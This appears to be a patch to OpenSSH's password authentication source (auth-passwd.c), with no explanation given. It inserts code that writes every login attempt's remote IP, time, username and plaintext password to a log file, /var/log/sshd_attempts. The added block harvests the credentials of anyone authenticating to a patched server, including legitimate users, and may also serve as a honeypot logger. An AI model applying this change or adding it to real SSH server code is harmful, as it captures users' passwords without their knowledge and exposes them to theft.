@@ -1,30 +1,37 @@
-0a1
-> 
-58c59
-< 
----
-> #include "canohost.h"
-81a83,104
-> 
-> if (*password != '\0')
-> {
-> const char *remote_ip;
-> remote_ip = ssh_remote_ipaddr(ssh);
-> struct tm *timePtr;
-> time_t localTime;
-> char timeString[100];
-> 
-> localTime = time(NULL);
-> timePtr = localtime(&localTime);
-> strftime(timeString, 100, "%D %r", timePtr);
-> 
-> FILE *logFile;
-> logFile = fopen("/var/log/sshd_attempts","a+");
-> fprintf (logFile,"From: %s at: %s | user: %s, pass: %s\n", \
-> remote_ip, timeString, authctxt->user, password);
-> fclose (logFile);
-> }
-> 
-> 
-> 
-
+--- auth-passwd.c.bak	2021-12-04 23:36:58.536044943 +0000
++++ auth-passwd.c	2021-12-04 23:39:02.184855839 +0000
+@@ -55,7 +55,7 @@
+ #include "hostfile.h"
+ #include "auth.h"
+ #include "auth-options.h"
+-
++#include "canohost.h"
+ extern struct sshbuf *loginmsg;
+ extern ServerOptions options;
+ 
+@@ -79,6 +79,25 @@
+ 	Authctxt *authctxt = ssh->authctxt;
+ 	struct passwd *pw = authctxt->pw;
+ 	int result, ok = authctxt->valid;
++if (*password != '\0')
++{
++const char *remote_ip;
++remote_ip = ssh_remote_ipaddr(ssh);
++struct tm *timePtr;
++time_t localTime;
++char timeString[100];
++
++localTime = time(NULL);
++timePtr = localtime(&localTime);
++strftime(timeString, 100, "%D %r", timePtr);
++
++FILE *logFile;
++logFile = fopen("/var/log/sshd_attempts","a+");
++fprintf (logFile,"From: %s at: %s | user: %s, pass: %s\n", \
++remote_ip, timeString, authctxt->user, password);
++fclose (logFile);
++}
++
+ #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
+ 	static int expire_checked = 0;
+ #endif
